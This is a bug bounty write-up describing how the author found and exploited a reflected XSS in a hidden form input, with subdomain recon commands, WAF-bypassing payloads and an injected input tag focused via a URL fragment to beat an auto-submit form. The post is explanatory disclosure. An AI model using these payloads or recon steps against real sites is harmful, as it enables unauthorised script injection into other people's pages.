---
layout: single
title: Defeating XSS filters using unexpected HTML attributes
excerpt: "Partial disclosure of a bug bounty report: defeating XSS filters using unexpected HTML attributes."
date: 2023-12-10
classes: wide
header:
  teaser: /assets/images/general/bug-bounty.jpg
  teaser_home_page: true
  icon:
categories:
  - bug bounty
tags:  
  - web
  - osint
  - amass
  - httpx
  - gau
  - kxss
  - burpsuite
  - xss
  - bypass
---

## Summary 

- [1. Asset discovery](#section-id-1)
- [2. Vulnerability discovery](#section-id-2)
- [3. Vulnerability exploitation](#section-id-3)
  - [3.1. Steps of exploitation](#section-id-3-1)
  - [3.2. Why does the payload work?](#section-id-3-2)
- [4. Report resolution](#section-id-4)
- [5. Lessons learned](#section-id-5)

![](/assets/images/general/bug-bounty.jpg)

> :warning: <span style="color:red">This bug was reported in a private program in which it is not allowed to publish the vulnerabilities found. So this is a partial disclosure, only the essential technical details are exposed.</span>

In this post I am going to show one of the strangest XSS I have ever found: reflected XSS bypassing hidden input tag and auto-submit script in a form. I was racking my brain for several days with this XSS, and I almost gave up. I will explain step by step all the difficulties that I found, how I managed to overcome them and also some doubts that arose that I did not know how to answer.

<div id='section-id-1'/>
## 1. Asset discovery

I found this asset through amass + httpx. If you are looking for http services on subdomains of the domain example.com and you have your config file in the path */home/user/.config/amass/config.ini*, you can use the following command

{% include codeHeader.html %}
```console
amass enum -brute -d example.com '/home/user/.config/amass/config.ini' | httpx -title -tech-detect -status-code -ip -p 66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6082,6346,6347,7001,7002,8080,8443,8888,30821
```

[Amass](https://github.com/OWASP/Amass) is an OSINT tool to perform network mapping of attack surfaces and external asset discovery which is a very famous tool used in the recon step in bug bounty. The output of the above amass command is a list of subdomains of the given domain, i.e, a list of potential targets.

[Httpx](https://github.com/projectdiscovery/httpx) is a multi-purpose HTTP toolkit allow to run multiple probers. In this case, the input of httpx is a list of subdomains and the output is a list of subdomains that have an http service in any of the ports given as a parameter. Also it shows some additional information about the service such as the title, the detected technologies... that I have specified in the parameters to be displayed.

**This domain is one of the most important domains of the company in question**, so it could also be obtained by googling the name of the company without the need to use any specific subdomain discovery tool.

<div id='section-id-2'/>
## 2. Vulnerability discovery

I found this vulnerability through gau + kxss. If you are looking for XSS in the subdomain www.example.com, you can use the following command

{% include codeHeader.html %}
```console
gau www.example.com | kxss
```

[Gau](https://github.com/lc/gau) is a tool used to fetch known URLs from AlienVault's Open Threat Exchange, the Wayback Machine, Common Crawl and URLScan for any given domain. This tool does not always find all the URLs of a domain but it is a good starting point to search XSS or other types of vulnerabilities.

[Kxss](https://github.com/Emoe/kxss) is a tool used to find all the "problematic characters" that are reflected in the response of any URL given as a parameter. The reflection of some problematic characters does not mean that an XSS exists but it is an indication that it could exist.

Both tools are based in other tools of [tomnomnom](https://github.com/tomnomnom).

In this case I got an output like the following

![](/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/gau-kxss-output.png)

The parameter had no special meaning. In fact all the parameters of the URL were vulnerable to XSS.

<div id='section-id-3'/>
## 3. Vulnerability exploitation

<div id='section-id-3-1'/>
## 3.1. Steps of exploitation

The first thing I did was to check where the payload was reflected by sending the following payload

{% include codeHeader.html %}
```html
HackCommander
```

The answer was

![](/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/burp-repeater-1.png)

so the payload was reflected in the attribute *value* of an input tag. After this I tried to send the payload

{% include codeHeader.html %}
```html
" autofocus onfocus="alert(1)">
```

but the WAF stopped the request, so I changed it to the payload.

{% include codeHeader.html %}
```html
" autofocus onfocus="[].map.call`${alert}1`">
```

and this was the response

![](/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/burp-repeater-2.png)

As you can see the problem was the *alert(1)* function, but this payload bypasses the WAF without problems.

However, the alert did not appear on the screen. The above payload is used a lot in XSS in the context of the attributes and that is why I used it. However, looking at the tag in which the payload is injected you can see that it is an input tag with type *hidden*, which means that the tag is hidden, it is not visible. In these cases it is impossible to focus on the tag so the attribute *autofocus* has no effect, it is not a valid attribute. That is why the code of the attribute *onfocus* is never executed and therefore the payload is not valid to exploit the XSS.

So there is not much to do injecting code into the input tag, so it will be necessary to break the tag and inject a new one. That's why I sent the following payload 

{% include codeHeader.html %}
```html
"><img src=1 onerror="[].map.call`${alert}1`">
```

to inject an img tag, and this was the response

![](/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/burp-repeater-3.png)

Seeing this response, one would expect that the alert should be executed, but it was not. When I enabled the burpsuite proxy and sent the request, I found that another request was sent second. This request was the one associated to the form in which we were injecting code and that has an auto-submit script, that is to say, that it is sent automatically.

I thought the problem might be that the img tag was being injected into a form so I sent the following payload

{% include codeHeader.html %}
```html
"></FORM><img src=1 onerror="[].map.call`${alert}1`">
```

to check if removing the img tag from the form would execute the alert. The response was

![](/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/burp-repeater-4.png)

and the behavior was the same.

In my opinion, this means that it is prioritizing the execution of the auto-submit JavaScript code before the processing of the injected img tag. However, I don't understand why because the img tag is part of the HTML code as well as the form so it should be processed before the JavaScript code.

From this idea I thought that I should think of an event that could be executed before any JavaScript code and I thought in the payload I used in the following post

[Reflected XSS in search filter clear button in an e-commerce website](https://hackcommander.github.io/posts/2023/06/24/reflected-xss-in-search-filter-clear-button/)

Maybe the focus of an attribute is executed before the auto-submit code so using the payload

{% include codeHeader.html %}
```html
"><input id="xss" onfocus="[].map.call`${alert}1`">
```

and adding the term *#xss* at the end of the URL to force the focus to the injected input tag, the alert should be executed.

The response was

![](/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/burp-repeater-5.png)

and the alert was executed

![](/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/alert.png)

<div id='section-id-3-2'/>
## 3.2. Why does the payload work??

This payload

{% include codeHeader.html %}
```html
"><input id="xss" onfocus="[].map.call`${alert}1`">
```

works because the *#xss* event is processed before the form's auto-submit, which makes sense. What doesn't make sense is that payloads such as

{% include codeHeader.html %}
```html
"></FORM><img src=1 onerror="[].map.call`${alert}1`">
```

don't work, since the tag

{% include codeHeader.html %}
```html
<img src=1 onerror="[].map.call`${alert}1`">
```

should be processed before the auto-submit request. So I must admit that I don't know why that payload doesn't work...

<p style="text-align:center;"><img src="/assets/images/general/no-idea.gif" style="width: 600px;"></p>

But we are bug bounty hunters, not monkeys banging on the keyboard, so it is worth at least trying to understand what is going on. So let's play a little.

If you host the following code

{% include codeHeader.html %}
```html
<html>
  <body>
    <script>alert("alert from script tag 1")</script>
    <img src=1 onerror="alert('alert from img tag 1')">
    <form action="http://localhost/form-path/" method="POST">
      <input type="hidden" name="test1-name" value="test1-value">
      <input id="xss" onfocus="alert('alert from input tag')">
      <script>alert("alert from script tag 2")</script>
      <script language="JavaScript"> document.forms[0].submit(); </script>
      <script>alert("alert from script tag 3")</script>
    </form>
    <img src=1 onerror="alert('alert from img tag 2')">
    <script>alert("alert from script tag 4")</script>
  </body>
</html>
```

in local and make the request *http://localhost/#xss*, you will see the following alerts:

- Displayed of *alert from script tag 1*.
- Displayed of *alert from script tag 2*.
- Displayed of *alert from img tag 1*.
- Displayed of *alert from input tag*.
- Form submit to the path *http://localhost/form-path/*.

In a nutshell, this means that the JavaScript code was executed in the following order

![](/assets/images/2023-12-10-reflected-xss-bypassing-hidden-input-tag-and-auto-submit-script/execution-priority.png)

And this is very interesting because we can extracts some conclusions:

- There is sequentiality but within a prioritization. First executes the JavaScript code inside script tags (codes 1 and 2), then the JavaScript code of the events (codes 3 and 4) and finally the code associated with the form submission (code 5), which is also a JavaScript code between script tags but needs to process the form first.
- No JavaScript code is executed after the form submission.

This does not explain why the img payload did not work, but it does explain why the focus on the input tag is done before the form submission, and therefore works. As this is not a course on JavaScript, it is sufficient to keep in mind that **the execution priority of JavaScript code is not trivial** and it depends on which parts of the response is the JavaScript code.

<div id='section-id-4'/>
## 4. Report resolution

As I said before, the affected domain was one the most important domains of the company so the asset criticity was classified as high. In fact at the time I reported this vulnerability there was a 3X reward multiplier on any vulnerability reported in certain domains of the company, including this one. Also an XSS usually is considered a medium severity vulnerability and because I wasn't able to sign up and log in the website, I couldn't demonstrate a high impact such as session hijacking. Therefore, the report was classified as 

- **Asset criticity**: High
- **Vulnerability severity**: Medium
- **Bounty**: More than $600 (because of the 3X reward multiplier)

<div id='section-id-5'/>
## 5. Lessons learned

- This XSS was in one of the company's main domains so it is unlikely that nobody had discovered it before. What probably happened is that they just used automated tools or gave up before finding the right payload. So, when you find the possible existence of a vulnerability, don't give up, try harder until you find the right payload because it surely exists.
- If you are struggling with an XSS trying to avoid a redirection, an auto-submit form... try to use the payload that we have seen in this post. As we saw, the focus through the hash in the URL is one of the first tasks that the browser performs when receiving a response, so it will be performed before tasks such as auto-submit form.
